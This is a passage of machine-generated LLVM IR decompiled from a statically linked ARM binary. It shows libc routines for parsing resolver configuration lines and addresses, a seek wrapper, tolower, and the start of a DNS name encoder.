  %v5_199fc = inttoptr i32 %v4_199fc to i8*
  %v6_199fc = load i8, i8* %v5_199fc, align 1
  %v8_199fc = zext i8 %v6_199fc to i32
  store i32 %v8_199fc, i32* %r3.global-to-local, align 4
  %v1_19a00 = and i32 %v8_199fc, 32
  %v2_19a00 = icmp eq i32 %v1_19a00, 0
  br i1 %v2_19a00, label %dec_label_pc_19a08, label %dec_label_pc_199e0

dec_label_pc_19a08:                               ; preds = %dec_label_pc_199f4
  %v0_19a08 = load i32, i32* @r6, align 4
  %v7_19a0c = icmp slt i32 %v0_19a08, 7
  br i1 %v7_19a0c, label %bb76, label %dec_label_pc_19a1c.preheader

bb76:                                             ; preds = %dec_label_pc_19a08
  %v9_19a0c = load i32, i32* @r4, align 4
  %v13_19a0c = mul i32 %v0_19a08, 4
  %v14_19a0c = add i32 %v9_19a0c, %v13_19a0c
  %v15_19a0c = inttoptr i32 %v14_19a0c to i32*
  store i32 %v8_19a0c, i32* %v15_19a0c, align 4
  %v8_19a10 = load i32, i32* @r6, align 4
  %v9_19a10 = add i32 %v8_19a10, 1
  store i32 %v9_19a10, i32* @r6, align 4
  %v0_19a1c25.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19a1c.preheader

dec_label_pc_19a1c.preheader:                     ; preds = %bb76, %dec_label_pc_19a08
  %v0_19a1c25 = phi i32 [ %v0_19a1c25.pre, %bb76 ], [ %v8_19a0c, %dec_label_pc_19a08 ]
  %v1_19a1c26 = inttoptr i32 %v0_19a1c25 to i8*
  %v2_19a1c27 = load i8, i8* %v1_19a1c26, align 1
  %v3_19a1c28 = zext i8 %v2_19a1c27 to i32
  store i32 %v3_19a1c28, i32* %r1.global-to-local, align 4
  %v2_19a2029 = icmp eq i8 %v2_19a1c27, 0
  br i1 %v2_19a2029, label %dec_label_pc_19a3c.loopexit, label %dec_label_pc_19a28.lr.ph

dec_label_pc_19a28.lr.ph:                         ; preds = %dec_label_pc_19a1c.preheader
  %v2_19a2c.pre = load i32, i32* @global_var_2d288, align 4
  br label %dec_label_pc_19a28

dec_label_pc_19a18:                               ; preds = %dec_label_pc_19a28
  %v1_19a18 = add i32 %v0_19a18, 1
  store i32 %v1_19a18, i32* %r2.global-to-local, align 4
  %v1_19a1c = inttoptr i32 %v1_19a18 to i8*
  %v2_19a1c = load i8, i8* %v1_19a1c, align 1
  %v3_19a1c = zext i8 %v2_19a1c to i32
  store i32 %v3_19a1c, i32* %r1.global-to-local, align 4
  %v2_19a20 = icmp eq i8 %v2_19a1c, 0
  br i1 %v2_19a20, label %dec_label_pc_19a3c.loopexit, label %dec_label_pc_19a28

dec_label_pc_19a28:                               ; preds = %dec_label_pc_19a28.lr.ph, %dec_label_pc_19a18
  %v0_19a18 = phi i32 [ %v0_19a1c25, %dec_label_pc_19a28.lr.ph ], [ %v1_19a18, %dec_label_pc_19a18 ]
  %v1_19a30 = phi i32 [ %v3_19a1c28, %dec_label_pc_19a28.lr.ph ], [ %v3_19a1c, %dec_label_pc_19a18 ]
  store i32 %v2_19a2c.pre, i32* %r3.global-to-local, align 4
  %v3_19a30 = mul nuw nsw i32 %v1_19a30, 2
  %v4_19a30 = add i32 %v3_19a30, %v2_19a2c.pre
  %v5_19a30 = inttoptr i32 %v4_19a30 to i8*
  %v6_19a30 = load i8, i8* %v5_19a30, align 1
  %v8_19a30 = zext i8 %v6_19a30 to i32
  store i32 %v8_19a30, i32* %r3.global-to-local, align 4
  %v1_19a34 = and i32 %v8_19a30, 32
  %v2_19a34 = icmp eq i32 %v1_19a34, 0
  br i1 %v2_19a34, label %dec_label_pc_19a18, label %dec_label_pc_19a3c.loopexit

dec_label_pc_19a3c.loopexit:                      ; preds = %dec_label_pc_19a28, %dec_label_pc_19a18, %dec_label_pc_19a1c.preheader
  %v0_19a3c = phi i32 [ %v0_19a1c25, %dec_label_pc_19a1c.preheader ], [ %v0_19a18, %dec_label_pc_19a28 ], [ %v1_19a18, %dec_label_pc_19a18 ]
  %v1_19a3c = inttoptr i32 %v0_19a3c to i8*
  %v2_19a3c = load i8, i8* %v1_19a3c, align 1
  %v3_19a3c = zext i8 %v2_19a3c to i32
  store i32 %v3_19a3c, i32* %r3.global-to-local, align 4
  %v2_19a40 = icmp eq i8 %v2_19a3c, 0
  br i1 %v2_19a40, label %dec_label_pc_19a48, label %dec_label_pc_199e8.preheader

dec_label_pc_199e8.preheader:                     ; preds = %dec_label_pc_19a3c.preheader, %dec_label_pc_19a3c.loopexit
  %v0_199e820 = phi i32 [ %v0_19a3c, %dec_label_pc_19a3c.loopexit ], [ %v0_19a3c30, %dec_label_pc_19a3c.preheader ]
  %v1_199e821 = inttoptr i32 %v0_199e820 to i8*
  %v2_199e822 = load i8, i8* %v1_199e821, align 1
  %v3_199e823 = zext i8 %v2_199e822 to i32
  store i32 %v3_199e823, i32* %r1.global-to-local, align 4
  %v2_199ec24 = icmp eq i8 %v2_199e822, 0
  br i1 %v2_199ec24, label %dec_label_pc_19a48, label %dec_label_pc_199f4

dec_label_pc_19a48:                               ; preds = %dec_label_pc_19a3c.loopexit, %dec_label_pc_199e8.preheader, %dec_label_pc_199e0, %dec_label_pc_19a3c.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19a4c = load i32, i32* @r6, align 4
  %v1_19a50 = load i32, i32* @r4, align 4
  %v5_19a50 = mul i32 %v0_19a4c, 4
  %v6_19a50 = add i32 %v1_19a50, %v5_19a50
  %v7_19a50 = inttoptr i32 %v6_19a50 to i32*
  store i32 0, i32* %v7_19a50, align 4
  %v7_19a54 = icmp sgt i32 %v0_19a4c, 1
  br i1 %v7_19a54, label %dec_label_pc_19a58, label %dec_label_pc_19afc

dec_label_pc_19a58:                               ; preds = %dec_label_pc_19a48
  %v2_19a58 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_19a58, i32* %r0.global-to-local, align 4
  %v7_19a5c = icmp eq i32 %v2_19a58, 1
  br i1 %v7_19a5c, label %dec_label_pc_19b30, label %dec_label_pc_19a64

dec_label_pc_19a64:                               ; preds = %dec_label_pc_19a58
  %v7_19a64 = icmp eq i32 %v2_19a58, 2
  br i1 %v7_19a64, label %dec_label_pc_19a70, label %dec_label_pc_19a9c.preheader

dec_label_pc_19a9c.preheader:                     ; preds = %dec_label_pc_19a64
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_19a9c

dec_label_pc_19a70:                               ; preds = %dec_label_pc_19a64
  store i32 %v0_19834, i32* %r0.global-to-local, align 4
  %v0_19a74 = load i32, i32* @r4, align 4
  %v1_19a74 = inttoptr i32 %v0_19a74 to i32*
  %v2_19a74 = load i32, i32* %v1_19a74, align 4
  store i32 %v2_19a74, i32* @r1, align 4
  %v3_19a78 = call i32 @__GI_strcoll(i8* %v2_19a78, i32 %v2_19a74)
  store i32 %v3_19a78, i32* %r0.global-to-local, align 4
  %v2_19a7c = icmp eq i32 %v3_19a78, 0
  br i1 %v2_19a7c, label %dec_label_pc_19aac, label %dec_label_pc_19afc

dec_label_pc_19a88:                               ; preds = %dec_label_pc_19a9c
  %v0_19a88 = load i32, i32* @r4, align 4
  %v4_19a88 = mul i32 %v1_19a88, 4
  %v5_19a88 = add i32 %v0_19a88, %v4_19a88
  %v6_19a88 = inttoptr i32 %v5_19a88 to i32*
  %v7_19a88 = load i32, i32* %v6_19a88, align 4
  store i32 %v7_19a88, i32* %r1.global-to-local, align 4
  %v3_19a8c = call i32 @__GI_strcasecmp(i8* %v2_19a78, i32 %v7_19a88)
  store i32 %v3_19a8c, i32* %r0.global-to-local, align 4
  %v2_19a90 = icmp eq i32 %v3_19a8c, 0
  %v0_19a94 = load i32, i32* @r5, align 4
  %v1_19a94 = add i32 %v0_19a94, 1
  store i32 %v1_19a94, i32* @r5, align 4
  br i1 %v2_19a90, label %dec_label_pc_19aac, label %dec_label_pc_19a9c

dec_label_pc_19a9c:                               ; preds = %dec_label_pc_19a9c.preheader, %dec_label_pc_19a88
  %v1_19a88 = phi i32 [ 1, %dec_label_pc_19a9c.preheader ], [ %v1_19a94, %dec_label_pc_19a88 ]
  %v1_19a9c = load i32, i32* @r6, align 4
  store i32 %v0_19834, i32* %r0.global-to-local, align 4
  %v5_19aa4 = icmp slt i32 %v1_19a88, %v1_19a9c
  br i1 %v5_19aa4, label %dec_label_pc_19a88, label %dec_label_pc_19afc

dec_label_pc_19aac:                               ; preds = %dec_label_pc_19a88, %dec_label_pc_19a70
  store i32 %v0_1982c, i32* %r1.global-to-local, align 4
  br i1 %v7_19ab0, label %dec_label_pc_19ab8, label %dec_label_pc_19ad4

dec_label_pc_19ab8:                               ; preds = %dec_label_pc_19aac
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_19abc = load i32, i32* @r7, align 4
  store i32 %v0_19abc, i32* %r2.global-to-local, align 4
  %v0_19ac0 = load i32, i32* @r4, align 4
  %v1_19ac0 = inttoptr i32 %v0_19ac0 to i32*
  %v2_19ac0 = load i32, i32* %v1_19ac0, align 4
  store i32 %v2_19ac0, i32* %r1.global-to-local, align 4
  %v3_19ac4 = inttoptr i32 %v2_19ac0 to i8*
  %v4_19ac4 = call i32 @inet_pton(i32 2, i8* %v3_19ac4, i32 %v0_19abc)
  store i32 %v4_19ac4, i32* %r0.global-to-local, align 4
  %v5_19acc = icmp sgt i32 %v4_19ac4, 0
  br i1 %v5_19acc, label %dec_label_pc_19908, label %dec_label_pc_19af8

dec_label_pc_19ad4:                               ; preds = %dec_label_pc_19aac
  store i32 %v0_1982c, i32* %r2.global-to-local, align 4
  br i1 %v7_19ad8, label %dec_label_pc_19ae0, label %dec_label_pc_19af8

dec_label_pc_19ae0:                               ; preds = %dec_label_pc_19ad4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_19ae4 = load i32, i32* @r4, align 4
  %v1_19ae4 = inttoptr i32 %v0_19ae4 to i32*
  %v2_19ae4 = load i32, i32* %v1_19ae4, align 4
  store i32 %v2_19ae4, i32* %r1.global-to-local, align 4
  store i32 %v0_199b0, i32* %r2.global-to-local, align 4
  %v3_19aec = inttoptr i32 %v2_19ae4 to i8*
  %v4_19aec = call i32 @inet_pton(i32 10, i8* %v3_19aec, i32 %v0_199b0)
  store i32 %v4_19aec, i32* %r0.global-to-local, align 4
  %v5_19af4 = icmp sgt i32 %v4_19aec, 0
  br i1 %v5_19af4, label %dec_label_pc_1994c, label %dec_label_pc_19af8

dec_label_pc_19af8:                               ; preds = %dec_label_pc_19ab8, %dec_label_pc_19ad4, %dec_label_pc_19ae0
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_19afc

dec_label_pc_19afc:                               ; preds = %dec_label_pc_19a9c, %dec_label_pc_19a70, %dec_label_pc_19a48, %dec_label_pc_19af8, %dec_label_pc_199a4
  %v0_19afc = load i32, i32* @fp, align 4
  store i32 %v0_19afc, i32* %r0.global-to-local, align 4
  %v0_19b00 = load i32, i32* @r8, align 4
  store i32 %v0_19b00, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_19b08 = call i32 @fgets(i32 %v0_19afc, i32 %v0_19b00, i32 %stack_var_-52.0)
  store i32 %v3_19b08, i32* %r0.global-to-local, align 4
  %v2_19b0c = icmp eq i32 %v3_19b08, 0
  br i1 %v2_19b0c, label %dec_label_pc_19b14, label %dec_label_pc_199bc

dec_label_pc_19b14:                               ; preds = %dec_label_pc_19afc, %dec_label_pc_1994c, %dec_label_pc_19908
  %v2_19b14 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_19b14, i32* %r3.global-to-local, align 4
  %v7_19b18 = icmp eq i32 %v2_19b14, 1
  br i1 %v7_19b18, label %dec_label_pc_19b30, label %dec_label_pc_19b20

dec_label_pc_19b20:                               ; preds = %dec_label_pc_19b14
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_19b24 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_19b24 = call i32 @__GI_fclose(i8* %v1_19b24)
  store i32 %v2_19b24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b30

dec_label_pc_19b2c:                               ; preds = %dec_label_pc_19848, %bb74, %dec_label_pc_1989c, %dec_label_pc_19894, %dec_label_pc_19888, %dec_label_pc_19874, %dec_label_pc_19858
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_19b30

dec_label_pc_19b30:                               ; preds = %dec_label_pc_19a58, %dec_label_pc_19b14, %dec_label_pc_19b20, %dec_label_pc_198f0, %dec_label_pc_19b2c
  %v0_19b30 = load i32, i32* @sl, align 4
  store i32 %v0_19b30, i32* %r0.global-to-local, align 4
  store i32 %v3_19818, i32* @r4, align 4
  store i32 %v6_19818, i32* @r5, align 4
  store i32 %v12_19818, i32* @r7, align 4
  store i32 %v15_19818, i32* @r8, align 4
  store i32 %v21_19818, i32* @sl, align 4
  store i32 %v24_19818, i32* @fp, align 4
  ret i32 %v0_19b30

; uselistorder directives
  uselistorder i32 %v1_19a88, { 1, 0 }
  uselistorder i32 %v0_19a4c, { 1, 0 }
  uselistorder i32 %v3_199e823, { 1, 0 }
  uselistorder i32 %v0_199e820, { 1, 0 }
  uselistorder i32 %v2_199c4, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_198c4, { 1, 0 }
  uselistorder i32 %v0_19888, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1986c, { 1, 0 }
  uselistorder i32 %v0_19838, { 1, 0, 2 }
  uselistorder i32 %v0_1982c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_19828, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 11, 17, 12, 13, 14, 15, 16, 0, 18, 19, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 21, 22, 23, 24 }
  uselistorder i32* %r2.global-to-local, { 13, 3, 4, 8, 9, 18, 10, 19, 11, 12, 20, 0, 1, 2, 5, 6, 7, 14, 16, 15, 17 }
  uselistorder i32* %r1.global-to-local, { 13, 4, 7, 8, 9, 0, 10, 1, 11, 12, 2, 3, 5, 6, 14 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 11, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 7, 8, 9, 10, 23, 25, 24 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 34, { 7, 2, 3, 0, 8, 9, 6, 1, 4, 10, 5 }
  uselistorder i32 (i8*)* @__GI_fclose, { 3, 4, 0, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 2, 1, 0, 3 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 31, 32, 33, 34, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32 7, { 2, 21, 22, 11, 12, 13, 0, 17, 25, 19, 1, 3, 4, 5, 18, 20, 8, 14, 15, 6, 7, 16, 10, 9, 23, 24 }
  uselistorder i32* @global_var_2d288, { 0, 6, 2, 7, 1, 3, 4, 8, 5, 9 }
  uselistorder i32 35, { 0, 2, 3, 4, 1 }
  uselistorder i32 10, { 3, 4, 38, 5, 6, 39, 40, 41, 42, 43, 30, 14, 29, 7, 44, 1, 45, 46, 47, 48, 12, 15, 33, 16, 34, 17, 18, 19, 0, 31, 32, 20, 27, 28, 35, 9, 21, 13, 36, 37, 11, 10, 2, 49, 50, 22, 8, 24, 25, 23, 26, 51 }
  uselistorder i32 80, { 0, 2, 3, 4, 1, 5, 6 }
  uselistorder i32 48, { 15, 5, 18, 2, 10, 11, 12, 3, 6, 13, 7, 20, 17, 14, 1, 0, 16, 19, 8, 9, 4 }
  uselistorder i32 36, { 10, 11, 12, 14, 15, 16, 17, 4, 1, 13, 0, 7, 8, 9, 2, 3, 5, 18, 6 }
  uselistorder i32 56, { 6, 5, 8, 3, 9, 4, 2, 0, 10, 7, 11, 1 }
  uselistorder i32 44, { 11, 12, 13, 9, 10, 18, 1, 8, 17, 15, 0, 14, 2, 3, 4, 5, 6, 16, 7 }
  uselistorder i32 -48, { 2, 3, 0, 4, 5, 6, 7, 1 }
  uselistorder i32* @fp, { 39, 42, 40, 1, 41, 43, 44, 45, 46, 0, 48, 47, 49, 50, 51, 2, 52, 53, 54, 55, 56, 57, 58, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 3, 4, 5, 6, 7, 8, 9, 10, 11, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 112, 113, 111, 106, 107, 108, 109, 110 }
  uselistorder i32* @sl, { 20, 21, 22, 23, 26, 24, 25, 27, 28, 29, 30, 31, 32, 33, 2, 3, 34, 35, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 4, 5, 6, 7, 8, 9, 10, 1, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* @r7, { 66, 68, 69, 67, 70, 71, 72, 73, 74, 75, 9, 10, 11, 12, 13, 14, 15, 1, 76, 84, 83, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 45, 46, 117, 16, 17, 2, 18, 6, 19, 20, 21, 22, 23, 24, 25, 26, 27, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 47, 48, 49, 50, 28, 29, 30, 31, 85, 3, 86, 87, 4, 5, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0, 7, 8, 43, 44, 115, 116, 62, 63, 64, 65, 77, 78, 79, 80, 81, 82, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder label %dec_label_pc_19b30, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_19b2c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_19afc, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_19af8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19a9c, { 1, 0 }
  uselistorder label %dec_label_pc_19a48, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_199e8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19a28, { 1, 0 }
  uselistorder label %dec_label_pc_199a4, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_19858, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_19b84, label %dec_label_pc_19b70

dec_label_pc_19b70:                               ; preds = %entry
  %v0_19b70 = call i32 @__errno_location()
  %v0_19b74 = load i32, i32* %r4.global-to-local, align 4
  %v1_19b74 = sub i32 0, %v0_19b74
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_19b7c = inttoptr i32 %v0_19b70 to i32*
  store i32 %v1_19b74, i32* %v2_19b7c, align 4
  %v0_19b8c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19b8c

dec_label_pc_19b84:                               ; preds = %entry
  %v2_19b84 = icmp eq i32 %arg1, 0
  br i1 %v2_19b84, label %dec_label_pc_19b98, label %dec_label_pc_19b8c

dec_label_pc_19b8c:                               ; preds = %dec_label_pc_19b84, %dec_label_pc_19b70
  %v0_19b8c = phi i32 [ %arg1, %dec_label_pc_19b84 ], [ %v0_19b8c.pre, %dec_label_pc_19b70 ]
  br label %dec_label_pc_19b9c

dec_label_pc_19b98:                               ; preds = %dec_label_pc_19b84
  br label %dec_label_pc_19b9c

dec_label_pc_19b9c:                               ; preds = %dec_label_pc_19b8c, %dec_label_pc_19b98
  %v14_19ba0 = phi i32 [ %v0_19b8c, %dec_label_pc_19b8c ], [ %tmp9, %dec_label_pc_19b98 ]
  ret i32 %v14_19ba0

; uselistorder directives
  uselistorder i32 ()* @__errno_location, { 62, 51, 71, 70, 69, 50, 49, 61, 60, 48, 17, 45, 41, 40, 26, 54, 11, 10, 9, 8, 23, 7, 22, 73, 57, 56, 64, 63, 38, 37, 36, 16, 55, 25, 44, 43, 53, 15, 29, 32, 65, 31, 42, 39, 59, 58, 0, 47, 46, 14, 52, 6, 5, 35, 28, 27, 34, 21, 4, 13, 1, 20, 12, 68, 67, 33, 19, 18, 66, 3, 2, 72, 30, 24 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_19b9c, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19bac = icmp slt i32 %arg1, 0
  br i1 %v1_19bac, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_19bac = mul i32 %arg1, 2
  %v2_19bb8 = load i32, i32* bitcast (i32** @global_var_2d5c4.1118 to i32*), align 4
  %v2_19bbc = add i32 %v2_19bb8, %v2_19bac
  %v3_19bc0 = inttoptr i32 %v2_19bbc to i8*
  %v4_19bc0 = load i8, i8* %v3_19bc0, align 1
  %v6_19bc0 = zext i8 %v4_19bc0 to i32
  %v1_19bc4 = add i32 %v2_19bbc, 1
  %v2_19bc4 = inttoptr i32 %v1_19bc4 to i8*
  %v3_19bc4 = load i8, i8* %v2_19bc4, align 1
  %v4_19bc4 = zext i8 %v3_19bc4 to i32
  %v3_19bc8 = mul nuw i32 %v4_19bc4, 16777216
  %v4_19bcc = sdiv i32 %v3_19bc8, 65536
  %v5_19bcc = or i32 %v4_19bcc, %v6_19bc0
  ret i32 %v5_19bcc

; uselistorder directives
  uselistorder i32 %v2_19bbc, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_19bd8 = load i32, i32* @r4, align 4
  store i32 %v3_19bd8, i32* %stack_var_-24, align 4
  %v6_19bd8 = load i32, i32* @r5, align 4
  %v9_19bd8 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_19be0 = load i32, i32* @r1, align 4
  store i32 %v0_19be0, i32* @r6, align 4
  %v0_19be4 = load i32, i32* @r2, align 4
  store i32 %v0_19be4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_19c4c19 = icmp slt i8* %arg1, null
  store i1 %v1_19c4c19, i1* %cpsr_n.global-to-local, align 1
  %v2_19c4c20 = icmp eq i8* %arg1, null
  store i1 %v2_19c4c20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c4c20, label %dec_label_pc_19c64, label %dec_label_pc_19c58

dec_label_pc_19bf0:                               ; preds = %dec_label_pc_19c58
  %v2_19bf0 = call i32 @__GI_strchr(i32 %v0_19bf021, i32 46)
  store i32 %v2_19bf0, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_19bf4 = icmp slt i32 %v2_19bf0, 0
  store i1 %v1_19bf4, i1* %cpsr_n.global-to-local, align 1
  %v2_19bf4 = icmp eq i32 %v2_19bf0, 0
  store i1 %v2_19bf4, i1* %cpsr_z.global-to-local, align 1
  %v0_19bf8 = load i32, i32* @r4, align 4
  %v2_19bf8 = sub i32 %v2_19bf0, %v0_19bf8
  store i32 %v2_19bf8, i32* %ip.global-to-local, align 4
  store i32 %v0_19bf8, i32* %r0.global-to-local, align 4
  br i1 %v2_19bf4, label %dec_label_pc_19c04, label %dec_label_pc_19c0c

dec_label_pc_19c04:                               ; preds = %dec_label_pc_19bf0
  %v1_19bfc = inttoptr i32 %v0_19bf8 to i8*
  %v3_19c04 = call i32 @strlen(i8* %v1_19bfc)
  store i32 %v3_19c04, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_19c04, 16777216
  %v1_19c08 = sdiv i32 %sext, 16777216
  store i32 %v1_19c08, i32* %ip.global-to-local, align 4
  %v0_19c18.pre = load i32, i32* @r4, align 4
  %v0_19c28.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19c0c

dec_label_pc_19c0c:                               ; preds = %dec_label_pc_19bf0, %dec_label_pc_19c04
  %v0_19c28 = phi i32 [ %v2_19bf0, %dec_label_pc_19bf0 ], [ %v0_19c28.pre, %dec_label_pc_19c04 ]
  %v0_19c18 = phi i32 [ %v0_19bf8, %dec_label_pc_19bf0 ], [ %v0_19c18.pre, %dec_label_pc_19c04 ]
  %v0_19c38 = phi i32 [ %v2_19bf8, %dec_label_pc_19bf0 ], [ %v1_19c08, %dec_label_pc_19c04 ]
  %v0_19c0c = load i32, i32* %r7.global-to-local, align 4
  %v1_19c0c = add i32 %v0_19c0c, 1
  store i32 %v1_19c0c, i32* @lr, align 4
  %v1_19c10 = load i32, i32* %r8.global-to-local, align 4
  %v2_19c10 = sub i32 %v1_19c10, %v0_19c0c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_19c14 = icmp slt i32 %v0_19c38, 0
  store i1 %v1_19c14, i1* %cpsr_n.global-to-local, align 1
  %v2_19c14 = icmp eq i32 %v0_19c38, 0
  store i1 %v2_19c14, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_19c18, i32* @r1, align 4
  %v0_19c1c = load i32, i32* @r6, align 4
  %v2_19c1c = add i32 %v0_19c1c, %v1_19c0c
  store i32 %v2_19c1c, i32* @r0, align 4
  store i32 %v0_19c38, i32* @r2, align 4
  %v1_19c24 = add i32 %v2_19c10, -1
  %v1_19c28 = add i32 %v0_19c28, 1
  store i32 %v1_19c28, i32* @r4, align 4
  br i1 %v2_19c14, label %.loopexit, label %dec_label_pc_19c30

dec_label_pc_19c30:                               ; preds = %dec_label_pc_19c0c
  %v2_19c30 = sub i32 %v0_19c38, %v1_19c24
  %v3_19c30 = icmp ult i32 %v0_19c38, %v1_19c24
  %v4_19c30 = xor i32 %v1_19c24, %v0_19c38
  %v5_19c30 = xor i32 %v2_19c30, %v0_19c38
  %v6_19c30 = and i32 %v5_19c30, %v4_19c30
  %v7_19c30 = icmp slt i32 %v6_19c30, 0
  store i1 %v7_19c30, i1* %cpsr_v.global-to-local, align 1
  %v8_19c30 = icmp slt i32 %v2_19c30, 0
  store i1 %v8_19c30, i1* %cpsr_n.global-to-local, align 1
  %v9_19c30 = icmp eq i32 %v0_19c38, %v1_19c24
  store i1 %v9_19c30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19c30, label %dec_label_pc_19c38, label %.loopexit

dec_label_pc_19c38:                               ; preds = %dec_label_pc_19c30
  %v1_19c38 = trunc i32 %v0_19c38 to i8
  %v4_19c38 = add i32 %v0_19c1c, %v0_19c0c
  %v5_19c38 = inttoptr i32 %v4_19c38 to i8*
  store i8 %v1_19c38, i8* %v5_19c38, align 1
  %v0_19c3c = load i32, i32* @lr, align 4
  %v1_19c3c = load i32, i32* %ip.global-to-local, align 4
  %v2_19c3c = add i32 %v1_19c3c, %v0_19c3c
  store i32 %v2_19c3c, i32* %r7.global-to-local, align 4
  %v0_19c40 = call i32 @memcpy()
  store i32 %v0_19c40, i32* %r0.global-to-local, align 4
  %v0_19c44 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_19c44 = icmp slt i32 %v0_19c44, 0
  store i1 %v1_19c44, i1* %cpsr_n.global-to-local, align 1
  %v2_19c44 = icmp eq i32 %v0_19c44, 0
  store i1 %v2_19c44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c44, label %dec_label_pc_19c64, label %dec_label_pc_19c38.dec_label_pc_19c4c_crit_edge

dec_label_pc_19c38.dec_label_pc_19c4c_crit_edge:  ; preds = %dec_label_pc_19c38
  %v0_19c4c.pre = load i32, i32* @r4, align 4
  store i32 %v0_19c4c.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_19c4c = icmp slt i32 %v0_19c4c.pre, 0
  store i1 %v1_19c4c, i1* %cpsr_n.global-to-local, align 1
  %v2_19c4c = icmp eq i32 %v0_19c4c.pre, 0
  store i1 %v2_19c4c, i1* %cpsr_z.global-to-local, align 1
